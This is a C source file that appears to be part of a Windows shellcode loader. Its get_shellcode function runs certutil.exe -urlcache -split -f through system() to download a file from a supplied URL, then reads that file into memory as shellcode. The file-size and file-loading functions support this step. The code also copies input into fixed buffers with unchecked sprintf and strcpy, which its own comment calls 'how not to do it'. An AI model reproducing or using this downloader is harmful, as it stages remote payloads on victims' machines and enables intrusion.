#include <stdio.h>
#include <windows.h>
#include <string.h>


// Searches for the last occurence of the '/' character and returns the string remaining after that last occurence
// Note that the return value will be pointing to the same string
char *get_filename_from_url(char *url) 
{
    int index = -1;
    int i = 0;

    while(url[i] != '\0')
    {
        if(url[i] == '/')
        {
            index = i;
        }
        i++;
    }

    return &url[index + 1];
}


int get_filesize(char *fvalue)
{
	int size,rc1;
	FILE *fp1 = fopen(fvalue, "rb");
	if (fp1 == NULL)
	{
		printf("get_filesize, %s not found\n", fvalue);
		return 0;
	}
	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
	fclose(fp1);
	
	#ifdef PRINT_DEBUG
		printf("get_filesize, filesize %s: %d\n", fvalue, size);
	#endif

	return size;
}


// Returns pointer to buffer that contains the file content
// Automatically allocates memory for this
unsigned char *load_textfile(char *fvalue, int size)
{
	#ifdef PRINT_DEBUG
		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
	#endif

	//allocate buffer, open file, read file to the buffer, close the file
	unsigned char *buffer = (unsigned char*) malloc(size+1);
	int i, rc;

	for (i=0; i<size; i++)
		buffer[i]=0x0;

	FILE *fp = fopen(fvalue, "rb");
	if (fp == NULL)
	{
		printf("load_textfile, %s not found\n", fvalue);
		return 0;
	}

	for (i=0; i<size; i++)
	{
		rc = getc(fp);
		buffer[i] = rc;
	}

	#ifdef PRINT_DEBUG
		printf("%s\n",buffer);
	#endif

	fclose(fp);	
	return buffer;
}


// Downloads the shellcode from the URI specified in arg1 to a file.
// The shellcode is then retrieved from the file.
//
// shellcode_size receives the size of the shellcode in bytes.
unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
	#ifdef PRINT_DEBUG
		printf("download shellcode to file via certutil\n");
	#endif
	
	char download[500];  //how not to do it...
	sprintf(download,"certutil.exe -urlcache -split -f %s", arg1);
	#ifdef PRINT_DEBUG
		printf("url: %s\n", download);
	#endif
	system(download);
	#ifdef PRINT_DEBUG
		printf("download done\n");
	#endif	
	
	char sh_filename[128];
	strcpy(sh_filename, get_filename_from_url(arg1));
	
	#ifdef PRINT_DEBUG
		printf("sh_filename = %s\n", sh_filename);
	#endif
	
	*shellcode_size = get_filesize(sh_filename);	
	return load_textfile(sh_filename, *shellcode_size);	
}
